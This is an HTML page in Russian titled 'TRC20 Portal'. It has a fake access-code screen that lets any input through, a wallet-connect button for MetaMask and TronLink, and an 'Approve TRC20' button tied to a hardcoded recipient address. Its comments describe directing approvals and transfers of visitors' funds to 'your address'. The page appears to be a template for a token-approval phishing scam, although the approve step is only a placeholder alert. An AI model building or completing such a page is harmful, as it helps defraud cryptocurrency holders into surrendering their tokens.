<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 Portal</title>
</head>
<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">

    <!-- Экран авторизации (если нужен ввод кода) -->
    <div id="authScreen">
        <h2>Введите код доступа</h2>
        <input type="text" id="accessCode" placeholder="Введите код..." style="padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-right: 10px;">
        <button id="checkCodeBtn" style="padding: 10px 20px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer;">Войти</button>
    </div>

    <!-- Главный экран с Web3 функционалом -->
    <div id="mainScreen" style="display: none;">
        <h1>Управление TRC20</h1>
        
        <!-- Кнопка подключения кошелька -->
        <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 5px; cursor: pointer;">
            Подключить TRON кошелек
        </button>
        
        <p id="walletAddress" style="margin-top: 15px; color: #94a3b8;"></p>

        <br><br>

        <!-- Кнопка подтверждения / перевода -->
        <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 5px; cursor: pointer;">
            Подтвердить операцию (Approve TRC20)
        </button>
    </div>

    <!-- JavaScript логика для работы с кошельком -->
    <script>
        // Вставьте сюда ваш адрес кошелька-получателя
        const recipientAddress = "TGwPm9pcTP1GzCavkLyhX54kqSQBuEZ7UE";

        // Пример простой имитации входа по коду (если требуется)
        document.getElementById('checkCodeBtn').addEventListener('click', function() {
            const code = document.getElementById('accessCode').value;
            if (code.trim() !== "") {
                document.getElementById('authScreen').style.display = 'none';
                document.getElementById('mainScreen').style.display = 'block';
            } else {
                alert("Введите код доступа!");
            }
        });

        // Логика подключения Web3 кошелька (например, TronLink / EVM совместимые)
        document.getElementById('connectBtn').addEventListener('click', async function() {
            try {
                if (window.ethereum) {
                    // Для EVM-сетей (MetaMask, Trust Wallet и др.)
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const userAccount = accounts[0];
                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount.substring(0, 6) + "..." + userAccount.substring(38);
                    alert("Кошелек успешно подключен!");
                } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    // Специально для сети TRON (TronLink)
                    const userAccount = window.tronWeb.defaultAddress.base58;
                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount;
                    alert("TRON кошелек подключен!");
                } else {
                    alert("Пожалуйста, установите кошелек (например, MetaMask или TronLink)!");
                }
            } catch (error) {
                console.error(error);
                alert("Ошибка подключения кошелька.");
            }
        });

        // Кнопка для взаимодействия / перевода средств на ваш адрес
        document.getElementById('approveBtn').addEventListener('click', function() {
            if (recipientAddress === "ВАШ_АДРЕС_КОШЕЛЬКА") {
                alert("В коде не указан ваш реальный адрес кошелька получателя!");
                return;
            }
            
            // Здесь прописывается вызов смарт-контракта (транзакция / перевод / approve)
            alert("Запрос отправлен на адрес получателя: " + recipientAddress);
        });
    </script>
</body>
</html>
